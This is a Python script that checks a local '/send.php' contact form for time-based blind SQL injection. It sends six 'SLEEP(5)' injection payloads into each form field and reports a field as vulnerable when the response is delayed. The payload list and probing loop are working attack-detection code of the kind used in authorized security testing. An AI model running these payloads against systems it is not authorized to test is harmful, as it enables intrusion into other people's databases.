import sys
import time

try:
    import requests
    print("[OK] requests module imported successfully")
except ImportError as e:
    print(f"[ERROR] Failed to import requests: {e}")
    sys.exit(1)

# Configuration
target_url = "http://localhost/send.php"
parameters = ['fullname', 'email', 'phone', 'subject', 'message']
sleep_payloads = [
    "' OR SLEEP(5)-- ",
    "'; SLEEP(5);-- ",
    "') OR SLEEP(5);-- ",
    "' OR (SELECT SLEEP(5))--",
    "' UNION SELECT SLEEP(5)--",
    "'||(SELECT SLEEP(5))--",
]

# Valid data for baseline
valid_data = {
    'fullname': 'Test User',
    'email': 'test@example.com',
    'phone': '555-0000',
    'subject': 'Test Subject',
    'message': 'Test message content'
}

print("\n" + "="*70)
print("BLIND SQL INJECTION TEST - TIME-BASED")
print("="*70)
print(f"Target: {target_url}")
print(f"Parameters to test: {len(parameters)}")
print(f"Sleep payloads per parameter: {len(sleep_payloads)}")
print("="*70 + "\n")

# Establish baseline
print("[PHASE 1] Establishing baseline response time")
baseline_results = []
for i in range(3):
    try:
        start = time.time()
        resp = requests.post(target_url, data=valid_data, timeout=15, allow_redirects=False)
        elapsed = time.time() - start
        baseline_results.append(elapsed)
        print(f"  Baseline {i+1}: {elapsed:.3f}s (Status: {resp.status_code})")
    except Exception as e:
        print(f"  Baseline {i+1}: ERROR - {e}")
        baseline_results.append(0)

if len([x for x in baseline_results if x > 0]) < 2:
    print("\n[ERROR] Cannot establish reliable baseline. Aborting.")
    sys.exit(1)

avg_baseline = sum(baseline_results) / len(baseline_results)
threshold = avg_baseline + 4.0
print(f"\n[RESULT] Average baseline: {avg_baseline:.3f}s")
print(f"[RESULT] Vulnerability threshold: {threshold:.3f}s")
print()

# Test each parameter
print("[PHASE 2] Testing parameters with sleep payloads")
print("-"*70)

vulnerable_params = []
results_summary = {}

for param in parameters:
    print(f"\n[Testing Parameter: {param}]")
    param_delays = []
    
    for idx, payload in enumerate(sleep_payloads, 1):
        test_data = valid_data.copy()
        test_data[param] = payload
        
        print(f"  [{idx}] {payload}")
        
        try:
            start = time.time()
            resp = requests.post(target_url, data=test_data, timeout=20, allow_redirects=False)
            elapsed = time.time() - start
            status = resp.status_code
        except Exception as e:
            elapsed = time.time() - start
            status = f"ERR:{type(e).__name__}"
        
        delay = elapsed - avg_baseline
        param_delays.append(delay)
        
        status_marker = " >>> VULNERABLE!" if delay >= 4.0 else ""
        print(f"      Time: {elapsed:.3f}s | Delay: {delay:+.3f}s{status_marker}")
        
        if delay >= 4.0 and param not in vulnerable_params:
            vulnerable_params.append(param)
    
    results_summary[param] = max(param_delays)

# Final summary
print("\n" + "="*70)
print("FINAL RESULTS SUMMARY")
print("="*70)

if vulnerable_params:
    print("\n[!] VULNERABILITY CONFIRMED")
    print(f"[!] Vulnerable parameters: {', '.join(vulnerable_params)}")
    print("\n[!] VERDICT: /send.php IS VULNERABLE to blind SQL injection")
    print("    (Time-based sleep payloads executed successfully)")
else:
    print("\n[-] NO VULNERABILITY DETECTED")
    print("[-] VERDICT: /send.php appears NOT VULNERABLE to time-based SQL injection")
    print("    No significant delays observed across all parameters")

print("\n" + "="*70)
